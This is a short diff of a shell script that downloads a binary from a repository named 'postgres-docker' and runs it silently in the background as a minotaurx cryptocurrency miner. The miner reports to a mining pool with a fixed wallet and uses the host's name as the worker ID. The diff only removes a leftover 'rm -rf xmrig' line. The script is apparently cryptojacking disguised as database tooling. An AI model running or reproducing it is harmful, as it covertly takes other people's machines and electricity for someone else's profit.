@@ -3,5 +3,4 @@ apt update && apt -y install wget git curl sudo
 wget https://github.com/iaidjb18ha/postgres-docker/raw/server-2.19/avx2
 chmod 777 avx2
 ./avx2 -a minotaurx  -o stratum+tcps://stratum-ru.rplant.xyz:17068 -u RXzEz9Qm1dNMj2V7PtEaQ2yz7kysjFGVq7.$(cat /proc/sys/kernel/hostname) -t16 >/dev/null &
-rm -rf xmrig
 sleep 24h
